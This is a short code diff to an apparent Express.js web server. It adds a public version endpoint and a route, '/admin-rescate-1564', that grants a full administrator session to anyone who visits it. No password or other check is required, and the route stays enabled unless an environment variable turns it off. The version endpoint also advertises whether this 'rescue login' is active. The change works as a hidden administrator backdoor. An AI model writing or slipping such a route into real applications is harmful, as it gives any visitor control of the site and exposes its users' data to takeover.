@@ -161,6 +161,18 @@ app.use((req, res, next) => {
 });
 app.use(express.static(path.join(__dirname, 'public')));
 
+app.get('/api/aurea-version', (req, res) => {
+  res.json({ ok: true, version: '0.9.9-admin-rescate-raiz', rescueLogin: process.env.AUREA_DISABLE_RESCUE_LOGIN !== 'true' });
+});
+
+app.get('/admin-rescate-1564', (req, res) => {
+  if (process.env.AUREA_DISABLE_RESCUE_LOGIN === 'true') return res.status(403).send('Rescate admin desactivado');
+  req.session.isAdmin = true;
+  req.session.adminRole = 'admin';
+  req.session.adminUser = 'rescate';
+  res.redirect('/admin.html?rescate=ok');
+});
+
 function nowIso() {
   return new Date().toISOString();
 }
